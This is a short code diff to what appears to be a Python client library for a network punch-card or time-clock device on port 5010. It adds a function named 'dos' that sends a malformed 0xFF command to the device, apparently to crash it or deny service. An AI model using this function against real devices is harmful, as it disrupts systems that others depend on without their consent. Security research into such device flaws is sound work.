@@ -313,3 +313,9 @@ def getCardInfo(ip, port=5010, CH=b"\x00\x00\x00\x00"):
     payload = makePayload(T5S_CMD_GET_PUNCHCARD, CH=CH)
     response = sendPayload(ip, port, payload)
     return response
+
+def dos(ip, port=5010, CH=b"\x00\x00\x00\x00"):
+    data = ''
+    payload = makePayload(0xFF, data=data, CH=CH)
+    response = sendPayload(ip, port, payload)
+    return response
